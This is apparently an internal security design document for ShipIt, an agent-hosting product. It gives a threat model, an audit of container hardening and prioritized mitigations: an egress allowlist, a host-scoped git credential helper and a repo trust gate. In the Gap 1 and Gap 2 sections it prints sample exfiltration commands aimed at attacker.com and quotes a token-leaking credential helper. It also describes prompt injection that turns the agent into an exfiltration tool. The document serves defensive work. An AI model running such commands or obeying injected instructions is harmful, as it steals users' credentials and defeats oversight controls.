---
title: Agent containment — environment-layer hardening for session containers
description: Threat model and prioritized mitigations for running a semi-autonomous agent with real credentials in a shared-kernel container, grounded in an audit of what exists today.
---

# Agent containment

ShipIt runs a semi-autonomous coding agent (Claude Code / Codex) inside a per-session
Docker container that holds **real credentials** — the user's GitHub token, their
Anthropic OAuth, and any user/MCP secrets — and, by product design (§5 of `CLAUDE.md`),
runs with **minimal human-in-the-loop friction**. The agent operates the box; the user
doesn't approve each command.

That design choice is deliberate and correct for the product. But it has a security
consequence spelled out in Anthropic's own writeup
([How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude)):
when you remove approval friction, **environment-layer containment has to carry the
load that the model layer and human-in-the-loop cannot.** No classifier reaches 100%,
and against *direct* prompt injection — a phished or socially-engineered user pasting
attacker instructions into chat, or attacker-controlled content arriving via a cloned
repo / uploaded file / fetched URL — there is "nothing anomalous for a classifier to
catch." In that scenario the only effective defenses are **egress control and
credential isolation**.

This doc records (a) the threat model, (b) an **audit of what containment exists today**
so the gaps are concrete rather than hypothetical, and (c) a prioritized set of
mitigations. It is a design/reference doc; individual mitigations should be triaged into
the tracker as separate work items.

## Threat model

The asset at risk is **the user's credentials and the integrity of their repos/account**,
not the orchestrator host (host-escape is separately well-defended — see audit below).
The realistic attack paths, in priority order:

1. **Direct prompt injection → credential exfiltration.** Attacker content reaches the
   agent (pasted by a tricked user, embedded in a cloned repo's README/source, in an
   uploaded file, or in a fetched web page) and instructs it to read a credential and
   send it somewhere. Today this succeeds — see Gap 1 and Gap 2.
2. **Untrusted-repo code execution.** Merely opening a malicious repo runs
   attacker-controlled shell before the user has vetted anything — see Gap 3.
3. **Container escape to host.** Strongly defended today (see "What's already solid").
   Residual risk is the shared host kernel (Gap 5) and one TOCTOU note.

We are explicitly **not** trying to stop a determined user from leaking *their own*
secrets — they own them. We are trying to stop *attacker-controlled instructions* from
turning the agent into an exfiltration tool, and to stop *opening a repo* from being
equivalent to running its code.

## What's already solid (audit findings — keep, don't regress)

The container-escape surface is genuinely well-built. Recording this so future work
doesn't weaken it:

- **Docker access is a positive allowlist, never the raw socket.** Session containers
  never mount `/var/run/docker.sock`. They reach Docker over TCP through
  `docker-proxy.ts`, which is an allowlist — unmatched endpoints return 403
  (`docker-proxy.ts:525`). `DELETE /images` and container `rename`/`update` are
  explicitly blocked; ops sessions get a read-only `tecnativa/docker-socket-proxy`
  (`templates-ops.ts:69`, `:ro`).
- **Child containers are sanitized** (`docker-proxy-sanitize.ts`): no `Privileged`, no
  `CapAdd`, `NET_RAW` force-dropped, no host/container namespace sharing, no device
  maps, no `VolumesFrom`, binds restricted to the session workspace or session-labeled
  volumes, resource limits inherited. `Runtime`, `SecurityOpt`, `UsernsMode`, etc. are
  stripped so a child can't re-open what the parent closed.
- **Agent container itself is hardened**: `CapDrop: ["ALL"]` with a minimal `CapAdd`,
  `SecurityOpt: ["no-new-privileges"]` (`container-lifecycle.ts:417-420`).
- **Per-session network + label isolation**: each Docker-enabled session gets its own
  bridge network; cross-session access is blocked by source-IP identification with
  `NET_RAW` dropped to prevent spoofing.
- **Compose has real validation** (`compose-generator.ts:351-421`): rejects
  `privileged: true`, `network_mode: host`, docker-socket mounts (unless explicitly
  opted in), absolute bind paths, and `..` traversal.
- **Chat history / usage / session metadata are NOT agent-writable.** They live in the
  orchestrator-host SQLite DB (`.shipit.db`), which is never mounted into the container
  (`app-di.ts:136`). The agent cannot corrupt them from inside — this already realizes
  the article's "no-delete for must-preserve data" principle, by construction. Keep it
  that way (see Gap 6 for the inverse risk on the data that *is* mounted).
- **GitHub token is not written to disk in the container** — it's brokered by a git
  credential helper rather than embedded in `.gitconfig` (`session-credentials.ts:49-59`).
  (But see Gap 2 — the helper itself is the leak.)

## Gaps (audit findings — prioritized)

### Gap 1 — No outbound egress control *(highest priority)*

There is **no egress allowlist, firewall, DNS filter, or HTTP proxy** on session
containers. They join a standard `bridge` network with no `internal: true`
(`session-container.ts:557`, `container-lifecycle.ts:350`), no `HTTP_PROXY`/`HTTPS_PROXY`
injected (`container-lifecycle.ts` `buildEnv()`), and `NET_RAW` is dropped only to stop
IP spoofing — ordinary `curl`/`wget`/`git`/DNS egress is unaffected. `preview-proxy.ts`
is inbound-only (browser → container).

**Consequence:** an injected agent can `curl https://attacker.com/?d=$SECRET`, exfiltrate
over DNS, or `git push` to an arbitrary remote. This is the single defense the article
identifies as load-bearing once approval friction is removed, and it is absent.

This is the article's central lesson and maps directly to their proxy work, including
the subtle part: an *allowlisted* domain still becomes an exfil channel if it's a
multi-tenant service (they saw uploads to an attacker's `api.anthropic.com` account).
So the mitigation is two-layered:

- **Egress allowlist** (default-deny). Funnel container egress through an
  orchestrator-controlled proxy or an `internal` network + NAT gateway that only permits
  known hosts (Anthropic/OpenAI APIs, the configured git host, package registries).
  Inject `HTTP_PROXY`/`HTTPS_PROXY` and enforce at the network layer so a raw socket
  can't bypass the env var.
- **Identity-validating proxy** for the allowlisted multi-tenant hosts: verify the
  request carries *this user's* session token, not an attacker-supplied one, so an
  allowlisted API can't be used to upload into someone else's account.

### Gap 2 — Git credential helper echoes the token to *any* host *(highest priority)*

`github-auth.ts:225` installs:

```
git config credential.helper '!f() { echo "password=${token}"; echo "username=x-access-token"; }; f'
```

The helper ignores the `host=` git feeds it on stdin and echoes the real GitHub token
**unconditionally**. So `git push https://attacker.com/repo.git` (or any HTTPS git URL)
receives the user's GitHub token as the basic-auth password. This is a concrete
instance of the article's "approved credential becomes an exfil surface" finding, and it
exfiltrates the token even *with* a generic egress allowlist if the attacker host is
reachable.

**Mitigation:** make the helper host-aware — read the `host=` line from stdin and emit
credentials **only** for the configured GitHub host(s), echoing nothing otherwise. Cheap,
self-contained, high-value; can ship independently of the broader egress work.

### Gap 3 — No trust boundary before repo-controlled code runs

Opening a freshly cloned repo runs its `shipit.yaml` `agent.install` shell commands
automatically, with no user confirmation: `readAgentConfig()` at session creation
(`session-container.ts:836`) → `runInstall()` fired immediately
(`service-manager-setup.ts:300-306`) → executed in-container via `POST /install`
(`session-worker.ts:632`). Compose services (`command:` / `build:`) start the same way.
A search for a trust prompt/boundary finds none — "trust" appears only in code comments.

This is precisely the article's **pre-trust code execution** vulnerability ("project
settings and hooks executed before trust prompts"). Their fix was to defer all
repo-controlled config parsing/execution until after an explicit trust acceptance.

**Mitigation:** a per-repo trust gate. First time a given remote is opened, defer
`agent.install` and compose `command:`/`build:` until the user accepts (one click, like
git's `safe.directory` / VS Code workspace trust). Cache the decision per remote so it's
a one-time prompt, not approval fatigue. Repos created *by* ShipIt from templates are
trusted by construction.

### Gap 4 — Local/agent-influenced inputs are trusted

`/uploads` and `/credentials` are mounted `:rw` (`container-lifecycle.ts:140, 126`); the
preview proxy trusts container-origin traffic. The article's guidance is that
project-open, config-load, uploaded files, and localhost connections deserve the *same*
rigor as external input — because all of them are vectors for the injected-content case
in the threat model. This is less a single fix than a lens to apply to Gaps 1/3 and to
future input surfaces (web fetch, MCP tool returns).

### Gap 5 — Shared host kernel (no gVisor / seccomp hardening)

Containers run the default `runc` runtime on the shared host kernel, with no custom
seccomp/AppArmor profile and `ReadonlyRootfs: false` (`container-lifecycle.ts:418`). The
article uses gVisor (syscall interception) for ephemeral claude.ai and full VMs for
Cowork precisely because shared-kernel isolation is the weakest tier. Given the strong
cap-dropping already in place, this is lower priority than egress, but worth evaluating:

- Run session containers under **gVisor (`runsc`)** for syscall-level isolation.
- Add a **custom seccomp profile** tighter than Docker's default.
- Make the **root filesystem read-only** with explicit writable mounts (workspace, /tmp,
  caches), shrinking the tamper surface and complementing Gap 6.

### Gap 6 — Mounted data is `:rw` where read-only would do

`/uploads` is `:rw`, so the agent can delete the user's uploads
(`container-lifecycle.ts:140`); `/credentials` is `:rw`. The host DB is already safe
(see "what's solid"), but mount modes elsewhere are uniformly read-write. The article
calls out read-only / no-delete mount modes as a cheap structural defense. Audit each
mount and downgrade to `:ro` where the agent has no legitimate write need (uploads are a
candidate; credentials need write only during first-turn provisioning and could be
provisioned then remounted read-only).

## Prioritization

| Pri | Gap | Why first | Rough shape |
|----|-----|-----------|-------------|
| P0 | Gap 2 — host-scoped git helper | Cheap, self-contained, plugs a concrete token leak | Edit one shell helper to read `host=` |
| P0 | Gap 1 — egress allowlist | The load-bearing defense once approval friction is gone | Default-deny egress proxy / internal net + gateway; identity-validating proxy for multi-tenant hosts |
| P1 | Gap 3 — repo trust gate | Stops "open repo == run its code" | Per-remote trust prompt, deferred install/compose |
| P2 | Gap 6 — read-only mounts | Structural, low-risk | Downgrade mounts to `:ro` where possible |
| P2 | Gap 5 — gVisor / seccomp / ro-rootfs | Hardens the weakest tier | Evaluate `runsc`, custom seccomp, `ReadonlyRootfs` |
| —  | Gap 4 — untrusted-input lens | Cross-cutting | Apply to Gaps 1/3 and future input surfaces |

## Design principles to preserve

- **Environment over model.** These are environment-layer controls by intent — they hold
  even when a classifier or system prompt is bypassed, which is the whole point.
- **Don't regress the escape hardening.** The Docker proxy allowlist and child-container
  sanitization are good; egress/trust work must not loosen them.
- **No new shell-shaped affordance for the user** (`CLAUDE.md` §5). The trust gate is an
  accept/deny prompt, not a command button. Egress control is invisible infrastructure.
- **Prefer battle-tested primitives over custom security code** — the article's explicit
  warning. Favor gVisor, standard proxies, and kernel firewalling over bespoke filters.

## Key files (audit references)

- `src/server/orchestrator/docker-proxy.ts`, `docker-proxy-sanitize.ts`,
  `docker-proxy-auth.ts` — Docker API allowlist + child sanitization (solid).
- `src/server/orchestrator/container-lifecycle.ts` — container HostConfig, caps, mounts,
  env, network mode (Gaps 1, 5, 6).
- `src/server/orchestrator/session-container.ts` — network creation (Gap 1).
- `src/server/orchestrator/github-auth.ts:225` — git credential helper (Gap 2).
- `src/server/orchestrator/service-manager-setup.ts:300-306`,
  `src/server/session/session-worker.ts:632` — `agent.install` auto-execution (Gap 3).
- `src/server/orchestrator/compose-generator.ts:351-421` — compose validation (solid;
  `command:`/`build:` still run — Gap 3).
- `src/server/orchestrator/session-credentials.ts`, `session-agent-env.ts` — credential
  provisioning into the container (Gaps 2, 4).

## Source

Anthropic, *How we contain Claude* —
https://www.anthropic.com/engineering/how-we-contain-claude
